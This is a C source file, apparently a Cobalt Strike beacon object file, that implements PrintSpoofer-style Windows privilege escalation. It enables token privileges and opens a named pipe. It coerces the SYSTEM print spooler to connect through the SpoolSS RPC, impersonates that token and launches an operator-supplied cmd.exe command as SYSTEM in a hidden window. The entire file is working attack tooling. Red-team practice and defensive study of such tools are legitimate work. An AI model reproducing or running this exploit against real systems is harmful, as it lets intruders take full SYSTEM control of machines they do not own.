/*
 * bof-printspoofer <command> [pipe] [timeout]
 *
 * PrintSpoofer-style local privilege escalation.  Creates a named-pipe server,
 * coerces the print spooler (SYSTEM) to connect to it through
 * RpcRemoteFindFirstPrinterChangeNotificationEx, impersonates the client and
 * optionally launches a command with the resulting SYSTEM token.
 *
 * Requires SeImpersonatePrivilege (service accounts / administrators) and a
 * running Spooler service.  If no command is supplied the impersonated token
 * is reported and reverted.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "tokenhelpers.h"
#include "spoolss.h"

static void enable_priv(const char *name)
{
    HANDLE tok = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    bof_memzero(&tp, sizeof(tp));
    if (ADVAPI32$LookupPrivilegeValueA(NULL, name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

static int run_as_current(const char *command)
{
    HANDLE tok = NULL, primary = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdline[2048];
    int ok = -1;

    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
                                  TOKEN_DUPLICATE | TOKEN_QUERY |
                                  TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE,
                                  TRUE, &tok)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenThreadToken failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return -1;
    }
    if (!ADVAPI32$DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, NULL,
                                   SecurityImpersonation, TokenPrimary,
                                   &primary)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tok);
        return -1;
    }

    cmdline[0] = 0;
    bof_strncpy(cmdline, "cmd.exe /c ", sizeof(cmdline));
    bof_strncat(cmdline, command, sizeof(cmdline) - bof_strlen(cmdline) - 1);

    bof_memzero(&si, sizeof(si));
    bof_memzero(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (ADVAPI32$CreateProcessAsUserA(primary, NULL, cmdline, NULL, NULL,
                                      FALSE, CREATE_NO_WINDOW, NULL, NULL,
                                      &si, &pi)) {
        DWORD code = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] process created as SYSTEM\n");
        KERNEL32$WaitForSingleObject(pi.hProcess, 30000);
        KERNEL32$GetExitCodeProcess(pi.hProcess, &code);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] exit code: %lu\n",
                     (unsigned long)code);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        ok = 0;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUser failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(primary);
    KERNEL32$CloseHandle(tok);
    return ok;
}

void go(char *args, int alen)
{
    datap parser;
    char *command = "", *pipearg = "bof_spool";
    int clen = 0, plen = 0, timeout = 20;
    char path[MAX_PATH], line[512];
    HANDLE pipe = NULL, ev = NULL;
    OVERLAPPED ov;
    BOOL ok;
    DWORD err, wait;

    BeaconDataParse(&parser, args, alen);
    command = BeaconDataExtract(&parser, &clen);
    pipearg = BeaconDataExtract(&parser, &plen);
    {
        int t = BeaconDataInt(&parser);
        if (t > 0 && t <= 300) timeout = t;
    }
    if (!command) command = "";
    if (!pipearg || !pipearg[0]) pipearg = "bof_spool";

    enable_priv("SeImpersonatePrivilege");
    enable_priv("SeAssignPrimaryTokenPrivilege");
    enable_priv("SeIncreaseQuotaPrivilege");

    bof_strncpy(path, "\\\\.\\pipe\\", sizeof(path));
    bof_strncat(path, pipearg, sizeof(path) - bof_strlen(path) - 1);
    if (bof_strlen(path) >= 250) {
        BeaconPrintf(CALLBACK_ERROR, "pipe name too long\n");
        return;
    }

    pipe = KERNEL32$CreateNamedPipeA(path, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                     PIPE_TYPE_BYTE | PIPE_WAIT, 1,
                                     4096, 4096, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }
    ev = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ev) {
        BeaconPrintf(CALLBACK_ERROR, "CreateEvent failed\n");
        KERNEL32$CloseHandle(pipe);
        return;
    }
    bof_memzero(&ov, sizeof(ov));
    ov.hEvent = ev;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] listening on %s\n", path);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] coercing spooler via SpoolSS\n");
    if (bof_spoolss_coerce(pipearg) != 0)
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[!] SpoolSS coercion returned an error; still waiting\n");

    ok = KERNEL32$ConnectNamedPipe(pipe, &ov);
    err = KERNEL32$GetLastError();
    if (!ok && err == ERROR_IO_PENDING) {
        wait = KERNEL32$WaitForSingleObject(ev, (DWORD)timeout * 1000);
        if (wait != WAIT_OBJECT_0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] spooler did not connect in %d s\n",
                         timeout);
            KERNEL32$CloseHandle(ev);
            KERNEL32$CloseHandle(pipe);
            return;
        }
    } else if (!ok && err != ERROR_PIPE_CONNECTED) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectNamedPipe failed: %lu\n",
                     (unsigned long)err);
        KERNEL32$CloseHandle(ev);
        KERNEL32$CloseHandle(pipe);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] spooler connected\n");
    if (!ADVAPI32$ImpersonateNamedPipeClient(pipe)) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateNamedPipeClient failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
    } else {
        HANDLE tok = NULL;
        if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY,
                                     TRUE, &tok)) {
            bof_token_line(tok, line, sizeof(line));
            KERNEL32$CloseHandle(tok);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] impersonating: %s\n", line);
        }
        if (command[0]) run_as_current(command);
        ADVAPI32$RevertToSelf();
    }

    KERNEL32$DisconnectNamedPipe(pipe);
    KERNEL32$CloseHandle(ev);
    KERNEL32$CloseHandle(pipe);
}
